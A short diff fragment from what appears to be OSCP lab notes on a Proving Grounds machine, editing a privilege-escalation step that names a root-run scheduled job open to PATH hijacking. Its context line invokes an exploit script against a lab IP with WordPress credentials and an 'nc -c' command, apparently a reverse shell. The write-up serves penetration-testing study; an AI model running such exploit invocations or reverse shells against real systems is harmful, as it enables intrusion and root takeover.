@@ -132,7 +132,7 @@ python3 50457.py 192.168.227.174 8888 / wordpress ThinnerATheWaistline348 "nc -c
 
 #### Privilege Escalation
 
-After searching for a while I found a schedule has customizing $HOME path and run by root. (hijacking PATH)
+After searching for a while I found a schedule ```wpclean``` has customizing $HOME path and run by root. (hijacking PATH)
 
 ![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/Shiftdel/Shiftdel_2022.01.30_20h22m7s_015.png)
 
